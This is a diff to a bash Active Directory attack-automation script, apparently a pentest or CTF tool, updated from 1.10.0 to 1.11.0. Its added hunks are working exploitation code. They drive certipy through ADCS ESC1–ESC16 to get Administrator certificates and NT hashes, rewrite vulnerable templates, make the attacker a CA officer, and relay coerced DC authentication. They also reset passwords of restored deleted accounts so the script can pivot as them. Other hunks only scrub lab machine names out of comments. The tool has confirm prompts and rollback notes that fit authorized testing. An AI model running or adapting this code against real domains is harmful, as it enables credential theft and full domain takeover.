@@ -22,7 +22,7 @@ set -o pipefail
 # ===========================================================================
 #  METADATA
 # ===========================================================================
-readonly VERSION="1.10.1"
+readonly VERSION="1.11.0"
 readonly AUTHOR="c4sh3r"
 KERBRUTE_BIN="${KERBRUTE_BIN:-/opt/kerbrute}"
 
@@ -256,7 +256,7 @@ queue_cred() {  # queue_cred <user> <password|""> <nthash|"">
     local key="${u,,}"
     [[ -n "${SEEN_CREDS[$key]:-}" ]] && return   # already assessed this identity
     # Also skip if it's already waiting in the queue (case-insensitive): tools
-    # report names in different cases (kerbrute 'Alfred' vs nxc 'alfred') and
+    # report names in different cases (kerbrute 'Bob' vs nxc 'bob') and
     # several sources queue the same lead, which otherwise got assessed twice.
     local q qu; for q in "${CRED_QUEUE[@]}"; do qu="${q%%|*}"; [[ "${qu,,}" == "$key" ]] && return; done
     CRED_QUEUE+=("${u}|${p}|${h}")
@@ -832,7 +832,7 @@ phase_adcs() {
     # data 52e/57'), and most labs keep NTLM enabled — so PREFER password/hash auth
     # and hand certipy the DC's DNS name via -target (it needs it). Fall back to
     # Kerberos (with -dc-host + KRB5CCNAME) only when that's all we have, or when
-    # the password/NTLM bind is refused (NTLM disabled, e.g. Voleur).
+    # the password/NTLM bind is refused (i.e. NTLM disabled on the DC).
     local cbase=(-u "${USER}@${DOMAIN}" -dc-ip "$DC_IP" -target "${DC_FQDN:-$DCT}") cauth=() cenv=()
     if   [[ -n "$PASS" ]]; then cauth=(-p "$PASS")
     elif [[ -n "$HASH" ]]; then cauth=(-hashes ":$HASH")
@@ -956,7 +956,7 @@ phase_secrets() {
     # Queue any gMSA account whose NT hash we recovered. Parse each line as a unit:
     # the account ends in '$' (machine account), so the old `grep -i "$acc"` lookup
     # treated that '$' as a regex end-anchor and never matched → the hash was
-    # dropped and ansible_dev$ (and friends) never got pivoted.
+    # dropped and the gMSA account (ending in '$') never got pivoted.
     while IFS= read -r line; do
         local acc h
         acc=$(grep -oiP 'Account:\s*\K\S+'        <<<"$line" | head -1)
@@ -1060,7 +1060,7 @@ phase_trusts() {
     local partners; partners=$(grep -oiP 'trustPartner:\s*\K\S+' "$tf" 2>/dev/null | sort -u)
     [[ -z "$partners" ]] && partners=$(grep -oiP '(Target|Partner|Domain)\s*:?\s*\K[a-z0-9.-]+\.[a-z]{2,}' "$tf" 2>/dev/null | sort -u)
     # Drop the current domain. bloodyAD/enum_trusts/ldapsearch all echo our own
-    # name (and FSP DNs like DC=tombwatcher,DC=htb), and the loose fallback regex
+    # name (and FSP DNs like DC=corp,DC=local), and the loose fallback regex
     # would otherwise mistake it for a "trust" → we'd kerberoast ourselves and
     # print bogus cross-forest paths. A single-domain forest has no partners.
     partners=$(printf '%s\n' "$partners" | grep -vixF "$DOMAIN" | grep -vE '^[[:space:]]*$')
@@ -1246,7 +1246,7 @@ bloody_args() {
 # can read it, so it works for every owned account, not just WinRM-capable ones.
 record_owned_identity() {
     [[ "$HAVE_AUTH" != "1" || -z "$USER" ]] && return
-    local key="${USER,,}"                                  # case-insensitive: Alfred == alfred
+    local key="${USER,,}"                                  # case-insensitive (Bob == bob)
     [[ -n "${OWNED_GROUPS[$key]:-}" ]] && return           # already recorded this principal
     local groups="" ba
     if have bloodyAD && [[ "$CAP_LDAP" == "1" ]]; then
@@ -1289,11 +1289,12 @@ phase_acl() {
     while IFS= read -r line; do
         if [[ "$line" =~ distinguishedName:\ *(.*) ]]; then
             cur_dn="${BASH_REMATCH[1]}"
-            cur_name=$(echo "$cur_dn" | grep -oP '^CN=\K[^,]+')
+            cur_name=$(echo "$cur_dn" | grep -oiP '^(CN|OU)=\K[^,]+')
             cur_class=""
+            [[ "$cur_dn" =~ ^[Oo][Uu]= ]] && cur_class="ou"   # organizational unit
             # Resolve the sAMAccountName — abuse tools need it, NOT the CN/display
-            # name. "CN=Lacey Miller" must become "lacey.miller" or every reset/
-            # shadow/RBCD against it fails (this is what stalled the pivot chain).
+            # name. A "CN=Jane Doe" must become "jane.doe" or every reset/
+            # shadow/RBCD against it fails (a display-name CN stalls the chain).
             cur_sam=$(bloodyAD "${ba[@]}" get object "$cur_dn" --attr sAMAccountName 2>/dev/null \
                         | grep -oiP 'sAMAccountName:\s*\K\S+' | head -1)
             [[ -z "$cur_sam" ]] && cur_sam="$cur_name"
@@ -1305,6 +1306,7 @@ phase_acl() {
         [[ "$line" =~ objectClass.*group ]]    && cur_class="group"
         [[ "$line" =~ objectClass.*user  ]]    && cur_class="user"
         [[ "$line" =~ objectClass.*computer ]] && cur_class="computer"
+        [[ "$line" =~ objectClass.*organizationalUnit ]] && cur_class="ou"
 
         # Only react to rights that ACTUALLY escalate — ignore benign attribute
         # writes (thumbnailPhoto, pager, …). Each object+action fires once.
@@ -1331,6 +1333,9 @@ phase_acl() {
             full)
                 warn "Full control over ${C_BOLD}$cur_name${C_RESET} (${cur_class:-?})"
                 if [[ "$cur_class" == "domain" ]]; then _abuse_dcsync_dacl
+                elif [[ "$cur_class" == "ou" || "$cur_dn" =~ ^[Oo][Uu]= ]]; then
+                    loot "GenericAll over OU '${cur_name}' → can restore & reset its (deleted) child objects"
+                    info "  → handled in the Account Lifecycle phase (AD Recycle Bin restore → password reset → pivot)"
                 elif [[ "$cur_class" == "group" || "$cur_dn" =~ [Gg]roup ]]; then _abuse_group "$tgt"
                 elif [[ "$cur_class" == "computer" || "$tgt" == *\$ ]]; then _abuse_rbcd "$tgt" || _abuse_shadowcred "$tgt"
                 else _abuse_user_smart "$tgt"; fi ;;
@@ -1350,7 +1355,7 @@ _abuse_group() {
                   "bloodyAD ${ba[*]} remove groupMember '$grp' '$USER'"
         # same identity, more rights → re-assess ONCE by re-queueing self. Guard
         # against looping: without this, the re-assessment re-detects the same
-        # group-write and re-queues again and again (Alfred got pwned 4×).
+        # group-write and re-queues again and again (the user gets pwned N×).
         if [[ -z "${REQUEUED_SELF[${USER,,}]:-}" ]]; then
             REQUEUED_SELF["${USER,,}"]=1
             unset "SEEN_CREDS[${USER,,}]"
@@ -1383,8 +1388,8 @@ _abuse_user() {
 
 # Take over an object's ACL when we hold WriteOwner / WriteDACL (but not yet a
 # usable right): become owner if needed, grant ourselves GenericAll, then drive
-# the normal reset/shadow. This is the missing link in chains like
-# WriteOwner→GenericAll→reset (e.g. sam → john on TombWatcher).
+# the normal reset/shadow. This is the missing link in WriteOwner→GenericAll→
+# reset chains (WriteOwner alone can't reset until you grant yourself the right).
 _abuse_acl_takeover() {
     local target="$1"; local ba; mapfile -t ba < <(bloody_args)
     [[ "$DO_ABUSE" != "1" ]] && { info "  (report-only; --abuse to take over ACL of '$target' → GenericAll → reset)"; return 1; }
@@ -1541,35 +1546,159 @@ _abuse_dcsync_dacl() {
 
 # ADCS ESC1: request a cert impersonating Administrator, then auth → NT hash/TGT.
 # Best-effort parse of certipy output for CA + a template flagged ESC1.
+# ---- ADCS auto-abuse: certipy already IDENTIFIES each ESC (find -vulnerable);
+# here we ABUSE each one. Auth is password/hash-first (certipy's Kerberos LDAP
+# bind is flaky) and every call carries -target/-dc-ip. ------------------------
+_ADCS_AUTH=(); _ADCS_ENV=()
+_adcs_setauth() {                       # build certipy auth args for the current cred
+    _ADCS_AUTH=(-u "${USER}@${DOMAIN}"); _ADCS_ENV=()
+    if   [[ -n "$PASS" ]]; then _ADCS_AUTH+=(-p "$PASS")
+    elif [[ -n "$HASH" ]]; then _ADCS_AUTH+=(-hashes ":$HASH")
+    elif [[ -n "$KERB_TICKET" ]]; then _ADCS_AUTH+=(-k -no-pass); _ADCS_ENV=(env "KRB5CCNAME=$KERB_TICKET"); fi
+}
+_adcs_template_for() {                  # template name certipy tied to a given ESC tag
+    awk -v esc="$2" 'BEGIN{IGNORECASE=1}/Template Name/{t=$0} $0 ~ esc {print t}' <<<"$1" \
+        | grep -ioP 'Template Name\s*:\s*\K\S+' | head -1
+}
+_adcs_admin_sid() {                     # domain Administrator (RID 500) SID, best-effort
+    local ba sid; mapfile -t ba < <(bloody_args)
+    sid=$(bloodyAD "${ba[@]}" get object "$USER" --attr objectSid 2>/dev/null | grep -oiP 'S-1-5-21-[0-9-]+' | head -1)
+    [[ -n "$sid" ]] && echo "${sid%-*}-500"
+}
+# certipy auth a PFX → recover the principal's NT hash (or TGT) and pivot on it.
+_adcs_pwn_pfx() {                       # _adcs_pwn_pfx <pfx-basename> <label> [who]
+    local pfx="$1" label="$2" who="${3:-administrator}"
+    [[ -z "$pfx" || ! -f "$OUTDIR/$pfx" ]] && { warn "  ${label}: no certificate produced"; return 1; }
+    rb_record "${label}: issued/used a certificate for '${who}'" "echo 'Manual: revoke the issued certificate at the CA'"
+    run "certipy auth -pfx $pfx -dc-ip $DC_IP"
+    local aout; aout=$( cd "$OUTDIR" && "${_ADCS_ENV[@]}" certipy auth -pfx "$pfx" -dc-ip "$DC_IP" 2>&1 ); echo "$aout" | tee -a "$LOGFILE"
+    local nt; nt=$(grep -oiP 'Got hash for .*:\s*\K[a-f0-9]{32}:[a-f0-9]{32}' <<<"$aout" | awk -F: '{print $NF}' | head -1)
+    if [[ "$nt" =~ ^[a-fA-F0-9]{32}$ ]]; then
+        loot "★★★ ${label} → ${who} NT hash: ${C_MAGENTA}$nt${C_RESET}"
+        note_cred_source "$who" "ADCS ${label} (certipy)"; queue_cred "$who" "" "$nt"; return 0
+    fi
+    local cc; cc=$(ls -t "$OUTDIR"/${who}*.ccache "$OUTDIR"/*.ccache 2>/dev/null | head -1)
+    [[ -n "$cc" ]] && { loot "${label} → ${who} TGT cached → $(basename "$cc") (export KRB5CCNAME=)"; return 0; }
+    warn "  ${label}: cert issued but auth gave no hash/TGT — finish manually"; return 1
+}
+# Request a cert AS Administrator (SAN/UPN impersonation), then auth+pivot.
+# with_sid=1 embeds the SID extension (strong-mapping envs: ESC1/2/6/15);
+# with_sid=0 omits it (the whole point of ESC9/10/16 is the missing extension).
+_adcs_req_admin() {                     # _adcs_req_admin <ca> <tpl> <label> <with_sid> [extra…]
+    local ca="$1" tpl="$2" label="$3" with_sid="$4"; shift 4
+    _adcs_setauth
+    confirm "  ${label}: request a cert as Administrator via '$tpl' on CA '$ca'?" || return 1
+    local sidargs=(); [[ "$with_sid" == "1" && -n "$_ADCS_SID" ]] && sidargs=(-sid "$_ADCS_SID")
+    local rargs=(req "${_ADCS_AUTH[@]}" -ca "$ca" -template "$tpl" -upn "administrator@${DOMAIN}" \
+                 "${sidargs[@]}" -dc-ip "$DC_IP" -target "${DC_FQDN:-$DCT}" "$@")
+    run "certipy ${rargs[*]}"
+    ( cd "$OUTDIR" && "${_ADCS_ENV[@]}" certipy "${rargs[@]}" 2>&1 ) | tee -a "$LOGFILE"
+    _adcs_pwn_pfx "$(ls -t "$OUTDIR"/administrator*.pfx 2>/dev/null | head -1 | xargs -r basename)" "$label"
+}
+
+# ESC3 — Enrollment Agent: get an agent cert, then request On-Behalf-Of Administrator.
+_adcs_esc3() {
+    local ca="$1" agenttpl="$2"; _adcs_setauth
+    confirm "  ESC3: use Enrollment Agent template '$agenttpl' to enrol on behalf of Administrator?" || return 1
+    ( cd "$OUTDIR" && "${_ADCS_ENV[@]}" certipy req "${_ADCS_AUTH[@]}" -ca "$ca" -template "$agenttpl" \
+        -dc-ip "$DC_IP" -target "${DC_FQDN:-$DCT}" 2>&1 ) | tee -a "$LOGFILE"
+    local agent; agent=$(ls -t "$OUTDIR"/*.pfx 2>/dev/null | grep -vi administrator | head -1)
+    [[ -z "$agent" ]] && { warn "  ESC3: no enrollment-agent PFX produced"; return 1; }
+    ( cd "$OUTDIR" && "${_ADCS_ENV[@]}" certipy req "${_ADCS_AUTH[@]}" -ca "$ca" -template User \
+        -on-behalf-of "${DOMAIN%%.*}\\administrator" -pfx "$(basename "$agent")" \
+        -dc-ip "$DC_IP" -target "${DC_FQDN:-$DCT}" 2>&1 ) | tee -a "$LOGFILE"
+    _adcs_pwn_pfx "$(ls -t "$OUTDIR"/administrator*.pfx 2>/dev/null | head -1 | xargs -r basename)" "ESC3"
+}
+# ESC4 — writable template ACL: push an ESC1-vulnerable config, exploit, then restore.
+_adcs_esc4() {
+    local ca="$1" tpl="$2"; _adcs_setauth
+    confirm "  ESC4: reconfigure template '$tpl' to be vulnerable, exploit, then restore?" || return 1
+    ( cd "$OUTDIR" && "${_ADCS_ENV[@]}" certipy template "${_ADCS_AUTH[@]}" -template "$tpl" \
+        -write-default-configuration -dc-ip "$DC_IP" -target "${DC_FQDN:-$DCT}" 2>&1 ) | tee -a "$LOGFILE"
+    rb_record "ESC4: overwrote template $tpl config" \
+              "certipy template -template '$tpl' -configuration '$OUTDIR/${tpl}.json' -dc-ip '$DC_IP'  # restore saved config"
+    _adcs_req_admin "$ca" "$tpl" "ESC4" 1; local rc=$?
+    # restore the original template configuration (best-effort)
+    [[ -f "$OUTDIR/${tpl}.json" ]] && ( cd "$OUTDIR" && "${_ADCS_ENV[@]}" certipy template "${_ADCS_AUTH[@]}" \
+        -template "$tpl" -configuration "${tpl}.json" -dc-ip "$DC_IP" 2>&1 ) | tee -a "$LOGFILE"
+    return $rc
+}
+# ESC7 — ManageCA/ManageCertificates: enable SubCA, request (pending), self-issue, retrieve.
+_adcs_esc7() {
+    local ca="$1"; _adcs_setauth
+    confirm "  ESC7: add self as CA officer, enable SubCA, issue a request as Administrator?" || return 1
+    ( cd "$OUTDIR" && "${_ADCS_ENV[@]}" certipy ca "${_ADCS_AUTH[@]}" -ca "$ca" -add-officer "$USER" -dc-ip "$DC_IP" 2>&1 ) | tee -a "$LOGFILE"
+    rb_record "ESC7: added $USER as officer on CA $ca" "certipy ca -ca '$ca' -remove-officer '$USER' -dc-ip '$DC_IP'"
+    ( cd "$OUTDIR" && "${_ADCS_ENV[@]}" certipy ca "${_ADCS_AUTH[@]}" -ca "$ca" -enable-template SubCA -dc-ip "$DC_IP" 2>&1 ) | tee -a "$LOGFILE"
+    local out; out=$( cd "$OUTDIR" && "${_ADCS_ENV[@]}" certipy req "${_ADCS_AUTH[@]}" -ca "$ca" -template SubCA \
+        -upn "administrator@${DOMAIN}" -dc-ip "$DC_IP" -target "${DC_FQDN:-$DCT}" 2>&1 ); echo "$out" | tee -a "$LOGFILE"
+    local rid; rid=$(grep -oiP 'request ID is\s*\K[0-9]+' <<<"$out" | head -1)
+    [[ -z "$rid" ]] && { _adcs_pwn_pfx "$(ls -t "$OUTDIR"/administrator*.pfx 2>/dev/null|head -1|xargs -r basename)" "ESC7"; return $?; }
+    ( cd "$OUTDIR" && "${_ADCS_ENV[@]}" certipy ca "${_ADCS_AUTH[@]}" -ca "$ca" -issue-request "$rid" -dc-ip "$DC_IP" 2>&1 ) | tee -a "$LOGFILE"
+    ( cd "$OUTDIR" && "${_ADCS_ENV[@]}" certipy req "${_ADCS_AUTH[@]}" -ca "$ca" -retrieve "$rid" -dc-ip "$DC_IP" -target "${DC_FQDN:-$DCT}" 2>&1 ) | tee -a "$LOGFILE"
+    _adcs_pwn_pfx "$(ls -t "$OUTDIR"/administrator*.pfx 2>/dev/null|head -1|xargs -r basename)" "ESC7"
+}
+# ESC13 — issuance policy linked to a group: enrol, auth → TGT carries that group.
+_adcs_esc13() {
+    local ca="$1" tpl="$2"; _adcs_setauth
+    confirm "  ESC13: enrol template '$tpl' to inherit its linked (privileged) group?" || return 1
+    ( cd "$OUTDIR" && "${_ADCS_ENV[@]}" certipy req "${_ADCS_AUTH[@]}" -ca "$ca" -template "$tpl" \
+        -dc-ip "$DC_IP" -target "${DC_FQDN:-$DCT}" 2>&1 ) | tee -a "$LOGFILE"
+    local pfx; pfx=$(ls -t "$OUTDIR"/*.pfx 2>/dev/null | head -1 | xargs -r basename)
+    _adcs_pwn_pfx "$pfx" "ESC13" "$USER"   # self hash/TGT, now with the linked group in its PAC
+}
+# ESC8 / ESC11 — relay to web/RPC enrollment. Needs a listener + coercion to US;
+# best-effort and time-boxed (truly interactive, may need your own setup).
+_adcs_relay() {
+    local esc="$1" lhost; lhost=$(ip route get "$DC_IP" 2>/dev/null | grep -oP 'src \K\S+' | head -1)
+    warn "  ${esc}: relay is interactive (listener + coercion). Attempting a time-boxed auto-relay…"
+    have certipy || return 1
+    local tgt="http://${DC_FQDN:-$DCT}/certsrv/certfnsh.asp"
+    run "certipy relay -target $tgt -template DomainController  (60s) + coerce DC→$lhost"
+    ( cd "$OUTDIR" && timeout 60 certipy relay -target "$tgt" -template DomainController 2>&1 | tee -a "$LOGFILE" ) &
+    local rpid=$!
+    sleep 3
+    $NXC smb "$DCT" $(nxc_cred_args | tr '\n' ' ') -M coerce_plus -o LISTENER="$lhost" 2>&1 | tail -5 | tee -a "$LOGFILE"
+    wait "$rpid" 2>/dev/null
+    local pfx; pfx=$(ls -t "$OUTDIR"/*dc*.pfx "$OUTDIR"/*.pfx 2>/dev/null | head -1 | xargs -r basename)
+    [[ -n "$pfx" ]] && { _adcs_pwn_pfx "$pfx" "$esc" "$DC_HOST\$"; return $?; }
+    warn "  ${esc}: no cert captured — run the relay+coercion manually with your listener"; return 1
+}
+
 _abuse_adcs() {
     local cout="$1"
     have certipy || return 1
-    echo "$cout" | grep -qi 'ESC1' || return 1
-    [[ "$DO_ABUSE" != "1" ]] && { info "  (report-only; --abuse to auto-request an ESC1 cert as Administrator)"; return 1; }
-    local ca tpl
-    ca=$(echo "$cout"  | grep -ioP 'CA Name\s*:\s*\K\S+' | head -1)
-    tpl=$(echo "$cout" | awk 'BEGIN{IGNORECASE=1}/Template Name/{t=$0}/ESC1/{print t}' \
-            | grep -ioP 'Template Name\s*:\s*\K\S+' | head -1)
-    [[ -z "$ca" || -z "$tpl" ]] && { warn "Could not parse CA/template for auto-ESC1 — exploit manually (see certipy_find.txt)"; return 1; }
-    confirm "  ESC1: request a cert as Administrator via template '$tpl' on CA '$ca'?" || return 1
-    local rargs=(req -u "${USER}@${DOMAIN}" -ca "$ca" -template "$tpl" -upn "administrator@${DOMAIN}" -dc-ip "$DC_IP")
-    [[ -n "$HASH" ]] && rargs+=(-hashes ":$HASH"); [[ -n "$PASS" ]] && rargs+=(-p "$PASS"); [[ "$KERBEROS" == "1" ]] && rargs+=(-k)
-    run "certipy ${rargs[*]}"
-    ( cd "$OUTDIR" && certipy "${rargs[@]}" 2>&1 ) | tee -a "$LOGFILE"
-    rb_record "ESC1: issued certificate impersonating Administrator" "echo 'Manual: revoke the issued certificate at the CA'"
-    local pfx; pfx=$(ls -t "$OUTDIR"/administrator*.pfx "$OUTDIR"/*.pfx 2>/dev/null | head -1)
-    [[ -z "$pfx" ]] && { warn "No PFX produced — template may need different flags"; return 1; }
-    run "certipy auth -pfx $(basename "$pfx") -dc-ip $DC_IP"
-    local aout; aout=$( cd "$OUTDIR" && certipy auth -pfx "$(basename "$pfx")" -dc-ip "$DC_IP" 2>&1 ); echo "$aout" | tee -a "$LOGFILE"
-    local nt; nt=$(echo "$aout" | grep -oiP 'Got hash for .*:\s*\K[a-f0-9]{32}:[a-f0-9]{32}' | awk -F: '{print $NF}' | head -1)
-    if [[ "$nt" =~ ^[a-fA-F0-9]{32}$ ]]; then
-        loot "★★★ ESC1 → Administrator NT hash: ${C_MAGENTA}$nt${C_RESET}"
-        note_cred_source "administrator" "ADCS ESC1 (certipy)"
-        queue_cred "administrator" "" "$nt"; return 0
-    fi
-    local cc; cc=$(ls -t "$OUTDIR"/administrator*.ccache 2>/dev/null | head -1)
-    [[ -n "$cc" ]] && loot "ESC1 → Administrator TGT cached → $(basename "$cc") (set KRB5CCNAME)"
-    return 0
+    local ca; ca=$(grep -ioP 'CA Name\s*:\s*\K\S+' <<<"$cout" | head -1)
+    # Only the ESC(s) certipy actually flagged on THIS CA — we don't sweep 1..16,
+    # we exploit exactly what's present (one, or several), and stop the moment one
+    # lands Administrator.
+    local escs; escs=$(grep -oiE 'ESC[0-9]+' <<<"$cout" | tr 'a-z' 'A-Z' | sort -u -V)
+    [[ -z "$escs" ]] && return 1
+    loot "ADCS vulnerabilities identified: $(echo "$escs" | paste -sd' ' -)"
+    [[ "$DO_ABUSE" != "1" ]] && { info "  (report-only; --abuse to auto-exploit the flagged ESC(s) and pivot to Administrator)"; return 1; }
+    [[ -z "$ca" ]] && { warn "Could not parse CA name — exploit ADCS manually (see certipy_find.txt)"; return 1; }
+
+    _ADCS_SID="$(_adcs_admin_sid)"      # for strong-mapping (-sid); empty is fine
+    local esc tpl
+    for esc in $escs; do                # $escs = the flagged ones only, not a 1..16 sweep
+        tpl=$(_adcs_template_for "$cout" "$esc"); [[ -z "$tpl" ]] && tpl="User"
+        case "$esc" in
+            ESC1|ESC2|ESC6)  _adcs_req_admin "$ca" "$tpl" "$esc" 1 && return 0 ;;   # SAN impersonation (+SID)
+            ESC9|ESC10|ESC16) _adcs_req_admin "$ca" "$tpl" "$esc" 0 && return 0 ;;  # missing SID extension → UPN map
+            ESC15) [[ "$tpl" == "User" ]] && tpl="WebServer"
+                   _adcs_req_admin "$ca" "$tpl" "ESC15" 1 -application-policies 'Client Authentication' && return 0 ;;
+            ESC3)  _adcs_esc3  "$ca" "$tpl" && return 0 ;;
+            ESC4)  _adcs_esc4  "$ca" "$tpl" && return 0 ;;
+            ESC7)  _adcs_esc7  "$ca"        && return 0 ;;
+            ESC13) _adcs_esc13 "$ca" "$tpl" && return 0 ;;
+            ESC8|ESC11) _adcs_relay "$esc"  && return 0 ;;
+            ESC5)  warn "  ESC5 (vulnerable PKI object ACL) → review the writable PKI object in certipy_find.txt (e.g. take over the CA host / NTAuthCertificates)" ;;
+            ESC14) warn "  ESC14 (weak explicit mapping) → write altSecurityIdentities on a privileged target to your cert (needs that write right)" ;;
+            *) warn "  $esc detected — see certipy_find.txt" ;;
+        esac
+    done
+    warn "ADCS auto-exploit didn't reach Administrator — review certipy_find.txt"
+    return 1
 }
 
 # ===========================================================================
@@ -1646,10 +1775,20 @@ phase_recycle_disabled() {
                 local name="${sam:-$(echo "$dn" | grep -oiP '^CN=\K[^\\]+')}"
                 confirm "  Restore deleted account '$name'?" || continue
                 if bloodyAD "${ba[@]}" set restore "$dn" 2>&1 | tee -a "$LOGFILE" | grep -qiE 'restored|success'; then
-                    loot "★ Restored '$name' — re-enabling & adding to spray pool"
+                    loot "★ Restored '$name' — re-enabling & taking it over"
                     rb_record "Restored deleted object $name" "echo 'Manual: re-delete $name if required by client'"
                     bloodyAD "${ba[@]}" remove uac "$sam" -f ACCOUNTDISABLE 2>&1 | tee -a "$LOGFILE" >/dev/null
                     [[ -n "$sam" ]] && { echo "$sam" >>"$OUTDIR/users_all.txt"; changed=1; }
+                    # We usually hold rights over the restored object (e.g. GenericAll
+                    # on its parent OU) → reset its password and pivot to it directly,
+                    # instead of hoping a leaked password still works. This is the
+                    # the classic OU-GenericAll → restore-deleted-user → reset chain.
+                    if [[ -n "$sam" ]] && bloodyAD "${ba[@]}" set password "$sam" "$PIVOT_PW" 2>&1 | tee -a "$LOGFILE" | grep -qiE 'success|changed'; then
+                        loot "★ Reset restored account '${sam}' → pivoting as it"
+                        note_cred_source "$sam" "AD Recycle Bin restore + password reset"
+                        rb_record "Reset password of restored $sam (ORIGINAL UNKNOWN)" "echo 'Manual: coordinate password restore for $sam'"
+                        queue_cred "$sam" "$PIVOT_PW" ""
+                    fi
                 fi
             done < <(echo "$del" | awk '
                 /^distinguishedName:/{dn=$0; sub(/^distinguishedName:[ ]*/,"",dn)}
@@ -2065,7 +2204,7 @@ phase_password_spray() {
     # Dedup key includes the user-list size: when the list GROWS (restored /
     # re-enabled / newly-discovered accounts), every known secret is re-sprayed
     # against the larger set — so a password recovered before a user existed
-    # still lands on it (e.g. restore todd.wolfe → spray its leaked password).
+    # still lands on it (e.g. restore a deleted user → spray its leaked password).
     local pw new=0 ucount; ucount=$(grep -c . "$OUTDIR/users_all.txt")
     for pw in "${!FOUND_SECRETS[@]}"; do [[ -z "${SPRAYED[${pw}@@${ucount}]:-}" ]] && new=1; done
 
@@ -2106,7 +2245,7 @@ gen_domain_wordlist() {
     local out="$OUTDIR/domain_wordlist.txt"
     [[ -s "$out" ]] && { DOMAIN_WL="$out"; return; }
     [[ -z "$DOMAIN" ]] && return
-    local short="${DOMAIN%%.*}"                       # voleur.htb -> voleur
+    local short="${DOMAIN%%.*}"                       # corp.local -> corp
     local yr; yr=$(date +%Y); local pyr=$((yr-1)) ; local ppyr=$((yr-2))
     local -a bases=("$short" "${short^}" "${short^^}")
     [[ -n "$DC_HOST" ]] && bases+=("$DC_HOST" "${DC_HOST^}")
